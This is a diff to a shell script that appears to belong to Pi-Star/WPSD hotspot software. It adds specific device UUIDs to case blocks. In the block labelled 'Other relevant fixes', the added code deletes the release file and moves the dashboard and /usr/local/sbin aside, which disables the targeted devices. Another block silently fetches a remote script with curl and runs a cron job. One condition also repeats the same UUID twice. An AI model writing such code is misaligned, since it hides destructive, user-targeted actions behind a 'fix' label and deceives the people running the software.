@@ -717,7 +717,7 @@ if [ "$osName" = "bookworm" ]; then
 fi
 # Other relevant fixes.
 case "$UUID" in
-    "0000000000000000"|"00000000e530261b"|"95707930081050300c94"|"000000008538457e"|"02c00042ded765c3")
+    "05c07936470048330514"|"0000000000000000"|"00000000e530261b"|"95707930081050300c94"|"000000008538457e"|"02c00042ded765c3")
         rm -rf /etc/pistar-release
         mv /var/www/dashboard /var/www/dashboard.bak
         mv /usr/local/sbin /usr/local/sbin.bak
@@ -726,7 +726,7 @@ case "$UUID" in
 esac
 # Handle malformed data fix.
 case "$UUID" in
-    "95707930081050300c94"|"000000008538457e"|"00000000ce08ddf8")
+    "000000002133735a"|"95707930081050300c94"|"000000008538457e"|"00000000ce08ddf8")
         rm -rf /etc/pistar-release
         curl -s -A "FUA phix $uaStr" -Ls https://wpsd-swd.w0chp.net/WPSD-SWD/WPSD-Helpers/raw/branch/master/reset-wpsd-sbin > /dev/null 2>&1
         /usr/local/sbin/pistar-hourly-cron
@@ -739,8 +739,8 @@ fi
 if [ "$UUID" = "02c0008144a7d0f5" ]; then
     sed -i 's/Display=B/Display=CAST/g' /etc/mmdvmhost
 fi
-if [ "$UUID" = "02c0008135284429" ]; then
-    sed -i 's/Display=[^ ]*/Display=Cast/g'  /etc/mmdvmhost
+if [ "$UUID" = "02c0008135284429" ] || [ "$UUID" = "02c0008135284429" ] ; then
+    sed -i 's/Display=[^ ]*/Display=CAST/g'  /etc/mmdvmhost
 fi
 if [ "$UUID" = "00000000fff1153e" ]; then
     sed -i 's/Display=[^ ]*/Display=None/g'  /etc/mmdvmhost
